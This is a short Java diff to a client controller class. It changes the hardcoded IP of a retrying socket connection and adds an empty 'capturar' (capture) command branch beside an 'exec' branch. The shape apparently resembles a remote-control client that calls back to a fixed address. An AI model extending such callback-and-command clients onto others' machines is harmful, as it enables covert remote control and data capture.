@@ -46,7 +46,7 @@ public class ClienteController {
 					System.out.println("Tentativa "+tentativa);
 					
 					try {
-						Socket conexao = new Socket("177.19.115.19", 37389);
+						Socket conexao = new Socket("179.180.139.229", 37389);
 						processandoConexao(conexao);
 						break;
 					} catch (UnknownHostException e) {
@@ -129,6 +129,11 @@ public class ClienteController {
 							}
 						}
 					});
+				}
+				else if(mensagem.contains("capturar")){
+					
+					
+					
 				}
 				else if(mensagem.contains("exec")){
 					
